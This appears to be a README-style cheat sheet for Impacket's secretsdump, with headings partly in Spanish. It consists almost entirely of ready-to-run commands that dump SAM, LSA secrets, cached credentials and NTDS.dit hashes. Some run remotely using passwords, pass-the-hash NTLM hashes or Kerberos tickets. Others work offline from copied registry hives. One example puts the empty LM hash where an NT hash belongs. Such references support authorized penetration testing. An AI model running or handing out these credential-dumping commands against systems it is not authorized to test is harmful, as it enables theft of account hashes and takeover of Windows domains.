<h1 align="center">Impacket Secretsdump Cheat Sheet</h1>

<p align="center">
  Advanced reference guide for dumping SAM, LSA secrets, cached credentials, and NTDS.dit databases remotely without executing agents on the target.
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Kali_Linux-111827?style=for-the-badge&logo=kalilinux&logoColor=00BFFF">
  <img src="https://img.shields.io/badge/Active_Directory-111827?style=for-the-badge&logo=microsoft&logoColor=00A4EF">
  <img src="https://img.shields.io/badge/Impacket-Secretsdump-111827?style=for-the-badge&logoColor=00BFFF">
  <img src="https://img.shields.io/badge/OffSec-Credential_Dumping-111827?style=for-the-badge&logoColor=FF003C">
  <img src="https://img.shields.io/badge/Type-CheatSheet-111827?style=for-the-badge&logoColor=00FFFF">
</p>

```
impacket-secretsdump -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 Workgroup/Administrator@10.10.10.20
```

```
impacket-secretsdump -just-dc-user Administrator -outputfile hashes_dc mi_dominio.local/admin_user:Pass123!@10.10.10.10
```

```
impacket-secretsdump dominio.local/admin_user:Pass123!@10.10.10.10
```

```
impacket-secretsdump -hashes :aad3b435b51404eeaad3b435b51404ee dominio/usuario@IP_OBJETIVO
```

```
impacket-secretsdump -k -no-pass dominio/usuario@IP_OBJETIVO
```

## Extracción Offline desde Archivos del Registro (SAM, SYSTEM, SECURITY)

```
impacket-secretsdump -sam SAM.hiv -system SYSTEM.hiv -security SECURITY.hiv LOCAL
```

```
impacket-secretsdump -system SYSTEM.hiv -ntds ntds.dit LOCAL
```

```
impacket-secretsdump -security SECURITY.hiv -system SYSTEM.hiv LOCAL
```

```
impacket-secretsdump -tse tse.dit -system SYSTEM.hiv LOCAL
```
> Licencias de terminal server
